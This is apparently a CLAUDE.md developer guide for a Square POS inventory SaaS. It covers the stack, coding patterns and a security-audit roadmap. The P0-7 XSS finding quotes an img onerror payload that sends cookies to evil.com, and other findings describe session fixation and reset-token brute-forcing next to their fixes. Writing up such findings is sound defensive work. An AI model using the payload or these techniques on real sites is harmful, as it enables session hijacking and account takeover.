# CLAUDE.md - JTPets Square Dashboard Tool

## Project Overview
Multi-tenant SaaS inventory management system for Square POS. Built for JTPets.ca (pet food/supplies with free local delivery) with goal of SaaS revenue. Running on Raspberry Pi.

## Tech Stack
- **Runtime**: Node.js 18+ with Express.js
- **Database**: PostgreSQL 14+
- **Process Manager**: PM2
- **External APIs**: Square SDK v43.2.1, Google APIs v144
- **Timezone**: America/Toronto

## Critical Rules

### Security First
- ALL database queries use parameterized SQL (`$1, $2` - never string concatenation)
- ALL user input validated via express-validator (see `middleware/validators/`)
- ALL routes require authentication unless explicitly public
- Multi-tenant isolation: EVERY query must filter by `merchant_id`
- Tokens encrypted with AES-256-GCM before storage

### Code Organization
```
routes/          → API endpoints (thin - validation + call service)
middleware/      → Auth, merchant context, validators, security
services/        → Business logic (loyalty/ has good examples)
utils/           → Shared utilities (database, Square API, logging)
database/
  schema.sql     → Base schema
  migrations/    → Incremental changes (###_description.sql)
jobs/            → Background jobs and cron tasks
```

### Response Format
```javascript
// Success
res.json({ success: true, data: { ... } });

// Error
res.status(4xx).json({ success: false, error: 'message', code: 'ERROR_CODE' });

// Helper available: utils/response-helper.js
const { sendSuccess, sendError, ErrorCodes } = require('../utils/response-helper');
```

### Multi-Tenant Pattern
```javascript
const merchantId = req.merchantContext.id;

// EVERY database query must include merchant_id
const result = await db.query(
    'SELECT * FROM items WHERE merchant_id = $1 AND id = $2',
    [merchantId, itemId]
);
```

### Error Handling
```javascript
const asyncHandler = require('../middleware/async-handler');

router.get('/endpoint', asyncHandler(async (req, res) => {
    // Errors automatically caught and passed to error handler
}));
```

## Database Commands

```bash
# Run migration
set -a && source .env && set +a
PGPASSWORD="$DB_PASSWORD" psql -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USER" -d "$DB_NAME" -f database/migrations/XXX_name.sql

# Connect to database
PGPASSWORD="$DB_PASSWORD" psql -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USER" -d "$DB_NAME"
```

## Development Commands

```bash
npm start                    # Production
npm run dev                  # Development with --watch
pm2 restart square-dashboard-addon  # After code changes
npm test                     # Run tests

# View logs
tail -f output/logs/app-*.log
tail -f output/logs/error-*.log
```

## Writing New Code

### New Route Checklist
1. Create validator in `middleware/validators/routename.js`
2. Create route file in `routes/routename.js` using `asyncHandler`
3. Add to `server.js`
4. Write tests in `__tests__/routes/routename.test.js`

### New Database Table Checklist
1. Add to `database/schema.sql`
2. Create migration `database/migrations/XXX_description.sql`
3. Include `merchant_id INTEGER REFERENCES merchants(id)` column
4. Add composite index with merchant_id as leading column

### Transaction Pattern
```javascript
const result = await db.transaction(async (client) => {
    await client.query('INSERT INTO table1...', [a, b]);
    await client.query('UPDATE table2...', [x, id]);
    return result;
});
```

### Batch Operations
```javascript
// Use ANY for batch lookups
const result = await db.query(
    'SELECT * FROM variations WHERE sku = ANY($1) AND merchant_id = $2',
    [skuArray, merchantId]
);
```

## Webhook Event Flow

Webhook processor: `services/webhook-processor.js`
Handlers: `services/webhook-handlers/`

```
POST /api/webhooks/square
├─► Verify HMAC-SHA256 signature
├─► Check idempotency (webhook_events table)
├─► Resolve merchant_id from square_merchant_id
└─► Route to handler by event.type:
    ├─► subscription-handler.js (subscription.*, invoice.*)
    ├─► catalog-handler.js (catalog.*, vendor.*, location.*)
    ├─► inventory-handler.js (inventory.count.updated)
    ├─► order-handler.js (order.*, payment.*, refund.*)
    ├─► loyalty-handler.js (loyalty.*, gift_card.*)
    └─► oauth-handler.js (oauth.authorization.revoked)
```

Feature flags: `WEBHOOK_CATALOG_SYNC`, `WEBHOOK_INVENTORY_SYNC`, `WEBHOOK_ORDER_SYNC`

## Square API

```javascript
const { getSquareClientForMerchant } = require('../middleware/merchant');
const squareClient = await getSquareClientForMerchant(merchantId);

// Write operations require idempotency key
const crypto = require('crypto');
await squareClient.orders.createOrder({
    idempotencyKey: crypto.randomUUID(),
    order: { ... }
});
```

## Architecture Reference

```
/home/user/SquareDashboardTool/
├── server.js                 # ~1,000 lines - route setup, middleware
├── config/constants.js       # Centralized configuration
├── database/
│   ├── schema.sql            # 50+ tables
│   └── migrations/           # 003-027
├── routes/                   # 20 route modules (~246 routes total)
├── middleware/
│   ├── auth.js, merchant.js, security.js
│   └── validators/           # 20 validator modules
├── services/
│   ├── webhook-processor.js  # Webhook routing
│   ├── sync-queue.js         # Sync state (persisted to DB)
│   ├── webhook-handlers/     # 6 event handlers
│   └── loyalty/              # Service layer example
├── jobs/                     # Cron tasks
│   ├── cron-scheduler.js, backup-job.js, sync-job.js
│   ├── cycle-count-job.js, webhook-retry-job.js
│   └── expiry-discount-job.js
└── utils/
    ├── database.js           # Pool with getPoolStats(), transaction()
    ├── square-api.js         # Square SDK wrapper
    ├── logger.js             # Winston with daily rotation
    └── response-helper.js    # sendSuccess/sendError helpers
```

### Middleware Stack
```
Request → requireAuth → loadMerchantContext → requireMerchant → validators.* → Route Handler
```

### Rate Limiting (middleware/security.js)
- deliveryRateLimit: 30/5min
- deliveryStrictRateLimit: 10/5min
- sensitiveOperationRateLimit: 5/15min

## Logging
```javascript
const logger = require('../utils/logger');
logger.info('Operation completed', { merchantId, result });
logger.error('Failed', { error: err.message, stack: err.stack });
```

## Common Issues

| Issue | Solution |
|-------|----------|
| "relation does not exist" | Run missing migration |
| "Cannot find module" | `npm install` |
| "merchant_id cannot be null" | Add `requireMerchant` middleware |
| Session issues after deploy | `pm2 restart square-dashboard-addon` |

---

## Technical Debt Status

**Last Review**: 2026-01-26
**Master Engineering Review**: 2026-01-26
**Current Grade**: B+ (Critical security issues found - DO NOT DEPLOY until P0 complete)
**Target Grade**: A++ (Production-ready SaaS)

### Grade Criteria
| Grade | Description |
|-------|-------------|
| A++ | Production SaaS-ready: comprehensive tests, scalable architecture, zero security concerns |
| A+ | Enterprise-ready: strong tests, good architecture, minor improvements possible |
| A | Solid - good patterns, all security fixes complete, tests comprehensive |
| B+ | **Current**: Good fundamentals, but CRITICAL security gaps discovered in master review |
| B | Functional: works but has significant debt |

### ⚠️ CRITICAL: Master Engineering Review Findings (2026-01-26)

**DO NOT allow real user accounts until P0-5, P0-6, and P0-7 are fixed.**

The following critical vulnerabilities were discovered during comprehensive code audit:

| Issue | Severity | Impact | Status |
|-------|----------|--------|--------|
| P0-5: Cookie name mismatch | 🔴 CRITICAL | Sessions persist after logout | OPEN |
| P0-6: No session regeneration | 🔴 CRITICAL | Session fixation attacks possible | OPEN |
| P0-7: XSS in 13 HTML files | 🔴 CRITICAL | Script injection via error messages | OPEN |
| P1-6: 7 routes missing validators | 🟡 HIGH | Input validation bypass | OPEN |
| P1-7: Password reset token reuse | 🟡 HIGH | Token brute-force possible | OPEN |

---

## Roadmap to A++

### Summary

| Priority | Status | Items |
|----------|--------|-------|
| P0 Security | 🔴 4/7 | P0-1,2,3 complete; P0-4 partial; **P0-5,6,7 NEW CRITICAL** |
| P1 Architecture | 🟡 5/9 | P1-1 in progress; P1-2,3,4,5 complete; **P1-6,7,8,9 NEW** |
| P2 Testing | 🟡 5.5/6 | Tests exist but P2-4 has implementation gap (see P0-6) |
| P3 Scalability | 🟡 Optional | Multi-instance deployment prep |

---

## P0: Security Fixes (CRITICAL)

These must be fixed before any production deployment or Square partnership discussions.

### P0-1: JSON Body Limit Enables DoS ✅
**File**: `server.js:129`
**Status**: FIXED (2026-01-26)

Reduced JSON body limit from 50mb to 5mb. POD uploads use multer with separate limits.

---

### P0-2: Subscription Check Fails Open ✅
**File**: `middleware/subscription-check.js:139-146`
**Status**: FIXED (2026-01-26)

Changed error handler to fail closed - returns 503 for API requests and redirects HTML requests when subscription status cannot be verified.

---

### P0-3: Error Messages Expose Internal Details ✅
**Status**: FIXED (2026-01-26)

Fixed 3 locations exposing internal error details to clients:
- `routes/subscriptions.js:601-612` - Refund errors now log details server-side, return generic message
- `routes/loyalty.js:1056-1066` - Square API errors now logged, return 502 with generic message
- `routes/google-oauth.js:97-101` - OAuth errors use generic `oauth_failed` code in redirect URL

---

### P0-4: CSP Allows Unsafe Inline 🟡 PARTIAL
**File**: `middleware/security.js:23-35`
**Status**: PARTIALLY FIXED (2026-01-26)

**Phase 1 COMPLETE**: All inline EVENT HANDLERS (`onclick`, `onchange`, etc.) migrated to event delegation pattern using `data-action` attributes.

**Phase 2 PENDING**: Inline `<script>` blocks still exist in HTML files. The `'unsafe-inline'` directive remains in `scriptSrc` until these are externalized to separate .js files.

**Remaining Work**: Externalize inline scripts from ~30 HTML files to `/public/js/` directory. Each page's inline script should become an external file (e.g., `login.html` inline script → `/public/js/login.js`).

**Completed Migration (27 HTML files, ~335 handlers)**:
- ✅ `logs.html` (pattern example)
- ✅ `settings.html` (19 handlers)
- ✅ `catalog-audit.html` (17 handlers)
- ✅ `expiry-audit.html` (17 handlers)
- ✅ `delivery-route.html` (23 handlers)
- ✅ `purchase-orders.html` (1 handler)
- ✅ `sales-velocity.html` (1 handler)
- ✅ `deleted-items.html` (5 handlers)
- ✅ `admin-subscriptions.html` (2 handlers)
- ✅ `cycle-count-history.html` (6 handlers)
- ✅ `driver.html` (10 handlers)
- ✅ `index.html` (1 handler)
- ✅ `delivery-settings.html` (1 handler)
- ✅ `subscribe.html` (9 handlers)
- ✅ `merchants.html` (7 handlers)
- ✅ `expiry.html` (15 handlers)
- ✅ `delivery-history.html` (10 handlers)
- ✅ `delivery.html` (15 handlers)
- ✅ `cycle-count.html` (15 handlers)
- ✅ `expiry-discounts.html` (18 handlers)
- ✅ `inventory.html` (23 handlers)
- ✅ `dashboard.html` (25 handlers)
- ✅ `vendor-catalog.html` (28 handlers)
- ✅ `reorder.html` (37 handlers)
- ✅ `gmc-feed.html` (39 handlers)
- ✅ `loyalty.html` (55 handlers)

**Event Delegation Pattern** (from `/public/js/event-delegation.js`):
```html
<!-- BEFORE (requires unsafe-inline): -->
<button onclick="refreshLogs()">Refresh</button>
<select onchange="filterLogs()">

<!-- AFTER (CSP compliant): -->
<button data-action="refreshLogs">Refresh</button>
<select data-change="filterLogs">
```
Global functions are automatically discovered by the event delegation module.

---

### P0-5: Session Cookie Name Mismatch 🔴 CRITICAL NEW
**Files**: `server.js:172`, `routes/auth.js:191`
**Status**: OPEN - FIX IMMEDIATELY
**Discovered**: Master Engineering Review 2026-01-26

**Problem**: Session cookie is configured with name `'sid'` but logout clears `'connect.sid'`:
```javascript
// server.js:172
name: 'sid',  // Cookie name is 'sid'

// routes/auth.js:191
res.clearCookie('connect.sid');  // WRONG! Should be 'sid'
```

**Impact**:
- User sessions persist after logout
- Attacker who obtains session cookie can use it indefinitely
- Session hijacking remains effective even after victim "logs out"

**Fix**:
```javascript
// routes/auth.js:191 - Change to:
res.clearCookie('sid');
```

---

### P0-6: Missing Session Regeneration on Login 🔴 CRITICAL NEW
**File**: `routes/auth.js:137-143`
**Status**: OPEN - FIX IMMEDIATELY
**Discovered**: Master Engineering Review 2026-01-26

**Problem**: Login handler does NOT call `req.session.regenerate()` before setting user data.

**Current Code** (VULNERABLE):
```javascript
// routes/auth.js:137-143 - After password verification
req.session.user = {
    id: user.id,
    email: user.email,
    name: user.name,
    role: user.role
};
```

**Attack Scenario (Session Fixation)**:
1. Attacker visits site, gets session ID `abc123`
2. Attacker tricks victim into using session ID `abc123` (via URL, cookie injection, etc.)
3. Victim logs in successfully
4. Session `abc123` now has victim's credentials
5. Attacker uses `abc123` to access victim's account

**Impact**: Complete account takeover without knowing victim's password

**Fix**:
```javascript
// routes/auth.js - After password verification, BEFORE setting user:
req.session.regenerate((err) => {
    if (err) {
        logger.error('Session regeneration failed', { error: err.message });
        return res.status(500).json({ error: 'Login failed' });
    }

    req.session.user = {
        id: user.id,
        email: user.email,
        name: user.name,
        role: user.role
    };

    // ... rest of login response
});
```

**Note**: Test at `__tests__/routes/auth.test.js:557` documents this requirement but tests a mock, not the actual implementation. The test passes but the code is vulnerable.

---

### P0-7: XSS via Unescaped innerHTML 🔴 CRITICAL NEW
**Files**: 13 HTML files with 25 vulnerable locations
**Status**: OPEN - FIX BEFORE PRODUCTION
**Discovered**: Master Engineering Review 2026-01-26

**Problem**: Template literals injected into innerHTML without escaping:
```javascript
// VULNERABLE - error.message could contain <script> tags
element.innerHTML = `Error: ${error.message}`;
element.innerHTML = `<div class="alert">${message}</div>`;
```

**Vulnerable Files**:
| File | Line(s) | Context |
|------|---------|---------|
| `public/login.html` | 350 | Server response message |
| `public/dashboard.html` | 965, 1162 | Error message, sync result |
| `public/delivery.html` | 1014 | Alert message |
| `public/settings.html` | 1077 | Error message |
| `public/vendor-catalog.html` | 1420, 1525, 1595 | Error messages |
| `public/reorder.html` | 799 | Error message |
| `public/gmc-feed.html` | 1310 | Error loading feed |
| `public/deleted-items.html` | 343 | Error message |
| `public/expiry.html` | 403 | Error message |
| `public/cycle-count-history.html` | 295 | Error message |
| `public/expiry-discounts.html` | 690 | Status data |
| `public/loyalty.html` | Multiple | Various error messages |

**Attack Scenario**:
1. Attacker crafts input that causes server error with payload: `<img src=x onerror="document.location='https://evil.com/steal?c='+document.cookie">`
2. Server returns error message containing the payload
3. Victim sees page with `innerHTML = error.message`
4. Script executes, stealing session cookie

**Impact**: Session hijacking, data theft, phishing via injected content

**Fix Pattern** (escapeHtml function exists in most files):
```javascript
// BEFORE (vulnerable):
element.innerHTML = `Error: ${error.message}`;

// AFTER (safe):
element.innerHTML = `Error: ${escapeHtml(error.message)}`;
```

**Note**: 257 uses of `escapeHtml()` already exist - the pattern is known, just inconsistently applied.

---

## P1: Architecture Fixes (HIGH)

### P1-1: Loyalty Service Migration 🟡 IN PROGRESS
**Status**: Modern service built & tested, but NOT wired into production

#### Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│ CURRENT PRODUCTION FLOW                                                 │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Webhook Events ──► webhook-processor.js ──► webhook-handlers/          │
│                                               ├── order-handler.js      │
│                                               └── loyalty-handler.js    │
│                                                        │                │
│                                                        ▼                │
│                                        ┌──────────────────────────────┐ │
│                                        │ utils/loyalty-service.js    │ │
│                                        │ (5,476 lines - LEGACY)      │ │
│                                        │                              │ │
│                                        │ • Order processing           │ │
│                                        │ • Customer identification    │ │
│                                        │ • Offer CRUD                 │ │
│                                        │ • Square Customer Groups     │ │
│                                        │ • Refund handling            │ │
│                                        │ • Catchup/backfill           │ │
│                                        │ • Settings & Audit           │ │
│                                        └───────────┬──────────────────┘ │
│                                                    │ uses               │
│                                                    ▼                    │
│                                        ┌──────────────────────────────┐ │
│                                        │ services/loyalty/            │ │
│                                        │   loyaltyLogger (only)       │ │
│                                        └──────────────────────────────┘ │
│                                                                         │
│  routes/loyalty.js ───────────────────► utils/loyalty-service.js       │
│  (Admin API - 35+ function calls)                                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ MODERN SERVICE (Built, Tested, NOT Connected)                           │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  services/loyalty/                                                      │
│  ├── index.js                 # Public API exports                      │
│  ├── webhook-service.js       # LoyaltyWebhookService (main entry)      │
│  ├── square-client.js         # LoyaltySquareClient + SquareApiError    │
│  ├── customer-service.js      # LoyaltyCustomerService                  │
│  ├── offer-service.js         # LoyaltyOfferService                     │
│  ├── purchase-service.js      # LoyaltyPurchaseService                  │
│  ├── reward-service.js        # LoyaltyRewardService                    │
│  ├── loyalty-logger.js        # Structured logging (USED by legacy)     │
│  ├── loyalty-tracer.js        # Request tracing                         │
│  └── __tests__/               # 2,931 lines of tests ✅                 │
│      ├── webhook-service.test.js    (491 lines)                         │
│      ├── purchase-service.test.js   (524 lines)                         │
│      ├── reward-service.test.js     (520 lines)                         │
│      ├── customer-service.test.js   (294 lines)                         │
│      ├── square-client.test.js      (303 lines)                         │
│      ├── offer-service.test.js      (245 lines)                         │
│      ├── loyalty-tracer.test.js     (241 lines)                         │
│      └── loyalty-logger.test.js     (313 lines)                         │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

#### What Modern Service Covers

| Feature | Modern Service | Method |
|---------|----------------|--------|
| Order processing | ✅ | `LoyaltyWebhookService.processOrder()` |
| Customer ID (5 methods) | ✅ | `LoyaltyCustomerService.identifyCustomerFromOrder()` |
| Purchase recording | ✅ | `LoyaltyPurchaseService.recordPurchase()` |
| Reward management | ✅ | `LoyaltyRewardService.*` |
| Offer lookups | ✅ | `LoyaltyOfferService.getActiveOffers()` |
| Square API calls | ✅ | `LoyaltySquareClient.*` |
| Structured logging | ✅ | `loyaltyLogger.*` |
| Request tracing | ✅ | `LoyaltyTracer` |

#### What Stays in Legacy (Admin Features)

| Feature | Used By | Notes |
|---------|---------|-------|
| Offer CRUD | `routes/loyalty.js` | Create/update/delete offers |
| Variation management | `routes/loyalty.js` | Add qualifying variations |
| Settings | `routes/loyalty.js` | Loyalty program settings |
| Audit logs | `routes/loyalty.js` | Query audit history |
| Customer caching | `routes/loyalty.js` | Local customer cache |
| Square Customer Group Discount | `order-handler.js` | Reward delivery mechanism |
| Refund processing | `order-handler.js` | Adjust quantities on refund |
| Catchup/backfill | `loyalty-handler.js` | Process missed orders |

#### Migration Plan

**Phase 1: Wire Up Modern Service (Add Feature Flag)** ✅ COMPLETE
```
Files modified:
  - services/webhook-handlers/order-handler.js
  - services/webhook-handlers/loyalty-handler.js
  - .env.example (added USE_NEW_LOYALTY_SERVICE=false)
  - config/constants.js (added FEATURE_FLAGS.USE_NEW_LOYALTY_SERVICE)

Both handlers now use FEATURE_FLAGS.USE_NEW_LOYALTY_SERVICE from config/constants.js:
  - Modern: LoyaltyWebhookService.processOrder()
  - Legacy: loyaltyService.processOrderForLoyalty() (default)

Results are normalized to legacy format for backward compatibility.
Other legacy functions (redemption detection, refunds, discounts) still use legacy service.
```

**Phase 2: Test in Production**
```bash
# .env - Enable for testing
USE_NEW_LOYALTY_SERVICE=true

# Monitor logs for [LOYALTY:*] entries
tail -f output/logs/app-*.log | grep LOYALTY
```

**Phase 3: Migrate Remaining Handlers**
- `services/webhook-handlers/loyalty-handler.js` - Use modern for order processing
- Keep legacy calls for: `runLoyaltyCatchup`, `isOrderAlreadyProcessedForLoyalty`

**Phase 4: Decide on Admin Features**
Options:
1. Add to modern service (`LoyaltyOfferService.createOffer()`, etc.)
2. Keep legacy as "admin service" separate from webhook processing
3. Extract to new `services/loyalty-admin/` module

#### Files Modified

| File | Changes | Status |
|------|---------|--------|
| `services/webhook-handlers/order-handler.js` | Uses `FEATURE_FLAGS.USE_NEW_LOYALTY_SERVICE` | ✅ |
| `services/webhook-handlers/loyalty-handler.js` | Uses `FEATURE_FLAGS.USE_NEW_LOYALTY_SERVICE` | ✅ |
| `.env.example` | Added `USE_NEW_LOYALTY_SERVICE=false` | ✅ |
| `config/constants.js` | Added `FEATURE_FLAGS.USE_NEW_LOYALTY_SERVICE` | ✅ |

#### Success Criteria

- [x] Feature flag `USE_NEW_LOYALTY_SERVICE` added (in `config/constants.js`)
- [ ] Modern service processes orders when flag is `true`
- [ ] Legacy service still works when flag is `false`
- [ ] No regression in loyalty tracking (compare results)
- [ ] Tracing shows full order processing pipeline
- [ ] All existing tests pass

---

### P1-2: Fat Routes Need Service Extraction 🟡 IN PROGRESS
**Problem**: Business logic in route handlers instead of services

| Route File | Lines | Service Created | Routes Wired | Status |
|------------|-------|-----------------|--------------|--------|
| `routes/catalog.js` | ~~1,493~~ → **327** | `services/catalog/` | ✅ **78% reduction** | ✅ COMPLETE |
| `routes/loyalty.js` | 1,645 | `services/loyalty/` | ❌ Pending | 🟡 Service exists (P1-1) |
| `routes/delivery.js` | 1,211 | `services/delivery/` | ✅ Already using service | ✅ COMPLETE |

**Progress (2026-01-26)**:
- ✅ Created `services/catalog/` with 4 service modules:
  - `item-service.js` - Locations, categories, items
  - `variation-service.js` - Variations, costs, bulk updates
  - `inventory-service.js` - Inventory, low stock, expirations
  - `audit-service.js` - Catalog audit, location fixes
- ✅ **Wired routes/catalog.js to use catalog service** (1,493 → 327 lines, 78% reduction)
  - All 17 endpoints now call catalogService methods
  - Zero direct db.query() calls in routes
  - Response format preserved for backward compatibility

**Pattern Applied**:
```javascript
// routes/catalog.js (thin - 327 lines)
router.get('/items', asyncHandler(async (req, res) => {
    const merchantId = req.merchantContext.id;
    const { name, category } = req.query;
    const result = await catalogService.getItems(merchantId, { name, category });
    res.json(result);
}));

// services/catalog/item-service.js (business logic)
async function getItems(merchantId, filters) {
    // All business logic here including db queries
}
```

**Remaining Work**:
- Wire routes/loyalty.js to call services/loyalty/ (admin features need extraction first)

**Why**: Routes should be thin controllers. Business logic in routes can't be unit tested without HTTP mocking.

---

### P1-3: Utils Directory Reorganization ✅ COMPLETE
**Problem**: 26 files (23,253 lines) mixing utilities, services, and domain logic
**Status**: FIXED (2026-01-26)

**Progress**:
- ✅ Created `services/merchant/` with settings-service.js (extracted from database.js)
- ✅ Created `services/delivery/` with delivery-service.js (moved from utils/)
- ✅ Created `services/expiry/` with discount-service.js (moved from utils/)
- ✅ Created `services/inventory/` with cycle-count-service.js (moved from utils/)
- ✅ Created `services/gmc/` with feed-service.js and merchant-service.js (moved from utils/)
- ✅ Created `services/vendor/` with catalog-service.js (moved from utils/)
- ✅ Created `services/reports/` with loyalty-reports.js (moved from utils/)
- ✅ Created `services/square/` with api.js (moved from utils/)
- ✅ Created `services/loyalty-admin/` with loyalty-service.js (5,475 lines)
- ✅ Re-export stubs in utils/ maintain backward compatibility

**Current Structure**:
```
services/                # Business logic services
├── loyalty/             # ✅ Modern service (P1-1)
├── loyalty-admin/       # ✅ Legacy loyalty admin service (5,475 lines)
│   ├── index.js
│   └── loyalty-service.js   # Offer CRUD, customer management, rewards
├── catalog/             # ✅ Catalog data management (P1-2)
│   ├── index.js
│   ├── item-service.js      # Locations, categories, items
│   ├── variation-service.js # Variations, costs, bulk updates
│   ├── inventory-service.js # Inventory, low stock, expirations
│   └── audit-service.js     # Catalog audit, location fixes
├── merchant/            # ✅ Settings service
│   ├── index.js
│   └── settings-service.js
├── delivery/            # ✅ Delivery order management
│   ├── index.js
│   └── delivery-service.js
├── expiry/              # ✅ Expiry discount automation
│   ├── index.js
│   └── discount-service.js
├── inventory/           # ✅ Cycle count batch generation
│   ├── index.js
│   └── cycle-count-service.js
├── gmc/                 # ✅ Google Merchant Center
│   ├── index.js
│   ├── feed-service.js      # TSV feed generation
│   └── merchant-service.js  # GMC API sync
├── vendor/              # ✅ Vendor catalog import
│   ├── index.js
│   └── catalog-service.js   # CSV/XLSX import, price comparison
├── reports/             # ✅ Report generation
│   ├── index.js
│   └── loyalty-reports.js   # Vendor receipts, audit exports
├── square/              # ✅ Square API integration
│   ├── index.js
│   └── api.js               # Sync, inventory, custom attributes, prices
├── webhook-handlers/    # ✅ Already organized
└── webhook-processor.js # ✅ Already here

utils/                   # Re-export stubs for backward compatibility
├── delivery-api.js      # → services/delivery/
├── expiry-discount.js   # → services/expiry/
├── cycle-count-utils.js # → services/inventory/
├── gmc-feed.js          # → services/gmc/feed-service.js
├── merchant-center-api.js # → services/gmc/merchant-service.js
├── vendor-catalog.js    # → services/vendor/
├── loyalty-reports.js   # → services/reports/
├── loyalty-service.js   # → services/loyalty-admin/
├── square-api.js        # → services/square/
├── database.js          # Re-exports getMerchantSettings from services/merchant/
└── ... (remaining true utilities)
```

**Completed Extractions**:
- ✅ `cycle-count-utils.js` → `services/inventory/cycle-count-service.js` (349 lines)
- ✅ `gmc-feed.js` → `services/gmc/feed-service.js` (589 lines)
- ✅ `merchant-center-api.js` → `services/gmc/merchant-service.js` (1,100 lines)
- ✅ `vendor-catalog.js` → `services/vendor/catalog-service.js` (1,331 lines)
- ✅ `loyalty-reports.js` → `services/reports/loyalty-reports.js` (969 lines)
- ✅ `square-api.js` → `services/square/api.js` (3,517 lines)
- ✅ `loyalty-service.js` → `services/loyalty-admin/loyalty-service.js` (5,475 lines)

---

### P1-4: Helper Function in server.js ✅
**File**: `utils/image-utils.js`
**Status**: FIXED (2026-01-26)

Moved `resolveImageUrls()` from server.js to `utils/image-utils.js` alongside the existing `batchResolveImageUrls()` function.

---

### P1-5: Inconsistent Validator Organization ✅ COMPLETE
**Status**: FIXED (2026-01-26)

Created `middleware/validators/auth.js` with validators for all auth endpoints:
- `login` - email and password validation
- `changePassword` - current password + new password strength check
- `createUser` - email, optional name/role/password validation
- `updateUser` - user ID param, optional name/role/is_active validation
- `resetUserPassword` - user ID param, optional password strength check
- `unlockUser` - user ID param validation
- `forgotPassword` - email validation
- `resetPassword` - token + password strength validation
- `verifyResetToken` - token query param validation

Updated `routes/auth.js` to use the new validators middleware.

**Remaining**: `routes/square-oauth.js` uses config validation (optional - low priority)

---

### P1-6: Missing Input Validators 🟡 HIGH NEW
**Files**: `routes/square-attributes.js`, `routes/cycle-counts.js`
**Status**: OPEN
**Discovered**: Master Engineering Review 2026-01-26

**Problem**: 7 routes accept POST/PUT requests without validation middleware:

| File | Line | Endpoint | Risk |
|------|------|----------|------|
| `square-attributes.js` | 49 | POST `/square/custom-attributes/init` | Low - no body params |
| `square-attributes.js` | 106 | POST `/square/custom-attributes/push/case-pack` | Low - no body params |
| `square-attributes.js` | 117 | POST `/square/custom-attributes/push/brand` | Low - no body params |
| `square-attributes.js` | 128 | POST `/square/custom-attributes/push/expiry` | Low - no body params |
| `square-attributes.js` | 139 | POST `/square/custom-attributes/push/all` | Low - no body params |
| `cycle-counts.js` | 401 | POST `/cycle-counts/email-report` | Low - no body params |
| `cycle-counts.js` | 416 | POST `/cycle-counts/generate-batch` | Low - no body params |

**Note**: These routes don't accept body parameters, so risk is low. However, validators should be added for consistency and to validate query params if any are added later.

**Fix**: Add validators even for parameterless routes (documents API contract):
```javascript
// middleware/validators/square-attributes.js
const init = []; // No params to validate, but documents intentional empty validation

// routes/square-attributes.js
router.post('/square/custom-attributes/init', requireAuth, requireMerchant, validators.init, asyncHandler(...));
```

---

### P1-7: Password Reset Token Not Invalidated on Failed Attempts 🟡 HIGH NEW
**File**: `routes/auth.js:639-699`
**Status**: OPEN
**Discovered**: Master Engineering Review 2026-01-26

**Problem**: Password reset token is only marked as `used` after successful password change (line 681). If an attacker guesses wrong passwords, the token remains valid indefinitely.

**Attack Scenario**:
1. Victim initiates password reset, receives token `xyz`
2. Attacker intercepts token (email compromise, shoulder surfing, etc.)
3. Attacker tries common passwords with token `xyz`
4. Token remains valid after each failed attempt
5. Attacker has unlimited attempts over 1-hour window

**Impact**: Combined with weak password policies, enables account takeover

**Fix Options**:

Option A - Limit attempts per token:
```javascript
// Add column: password_reset_tokens.attempts_remaining DEFAULT 5
// On each failed attempt: decrement and check
if (token.attempts_remaining <= 0) {
    return res.status(400).json({ error: 'Reset link expired' });
}
await db.query('UPDATE password_reset_tokens SET attempts_remaining = attempts_remaining - 1 WHERE id = $1', [token.id]);
```

Option B - Rate limit endpoint per token:
```javascript
const resetRateLimit = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5,
    keyGenerator: (req) => req.body.token
});
```

---

### P1-8: Webhook Endpoint Not Rate Limited 🟡 MEDIUM NEW
**File**: `server.js:260`
**Status**: OPEN
**Discovered**: Master Engineering Review 2026-01-26

**Problem**: `/api/webhooks/square` endpoint has no rate limiting. While HMAC signature verification provides authentication, an attacker could:
1. Replay valid signed requests rapidly
2. DDoS the webhook processing pipeline
3. Exhaust database connections with rapid webhook processing

**Current Protection**: HMAC signature verification + idempotency table
**Missing**: Request rate limiting

**Fix**:
```javascript
// middleware/security.js - Add webhook rate limiter
const webhookRateLimit = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 100, // 100 webhooks per minute per merchant
    keyGenerator: (req) => {
        // Key by Square merchant ID from payload
        return req.body?.merchant_id || req.ip;
    },
    message: { error: 'Too many webhook requests' }
});

// server.js - Apply to webhook route
app.use('/api/webhooks/square', webhookRateLimit);
```

---

### P1-9: Error Messages Still Expose Internal Details 🟡 MEDIUM NEW
**File**: `routes/subscriptions.js`
**Status**: OPEN
**Discovered**: Master Engineering Review 2026-01-26

**Problem**: While P0-3 fixed 3 locations, additional error exposure found:

| Line | Issue |
|------|-------|
| 237 | Returns Square customer creation error detail |
| 257 | Returns Square card creation error detail |
| 335 | `'Payment failed: ' + (paymentError.message)` |
| 381 | `'Subscription failed: ' + (subError.message)` |

**Impact**: Exposes Square API internals, aids attacker reconnaissance

**Fix Pattern**:
```javascript
// BEFORE:
return res.status(400).json({ error: errorMsg });

// AFTER:
logger.warn('Customer creation failed', { error: errorMsg, email });
return res.status(400).json({
    success: false,
    error: 'Account creation failed. Please try again.',
    code: 'CUSTOMER_CREATION_FAILED'
});
```

---

## P2: Testing Requirements (HIGH)

### P2-1: Multi-Tenant Isolation Tests ✅ COMPLETE
**File**: `__tests__/security/multi-tenant-isolation.test.js` (26 tests)
**Status**: COMPLETE (2026-01-26)

**All required tests exist**:
- ✅ User A cannot access Merchant B's data
- ✅ List endpoints don't leak data across tenants
- ✅ Direct merchant_id parameter manipulation rejected
- ✅ Merchant context loading with user_merchants verification
- ✅ Session activeMerchantId doesn't grant unauthorized access
- ✅ Cross-tenant update/delete prevention
- ✅ Bulk operations respect merchant boundaries
- ✅ Webhook routing by square_merchant_id
- ✅ Data leakage prevention in error messages, pagination, search
- ✅ Merchant role isolation per-tenant

---

### P2-2: Payment/Refund Flow Tests ✅ COMPLETE
**File**: `__tests__/routes/subscriptions.test.js` (59 tests)
**Status**: COMPLETE (2026-01-26)

**All required tests exist**:
- ✅ Promo code validation (dates, limits, discounts)
- ✅ Subscription creation input validation
- ✅ Duplicate email prevention
- ✅ Plan validation
- ✅ PCI compliance (no card data storage)
- ✅ Admin refund authorization
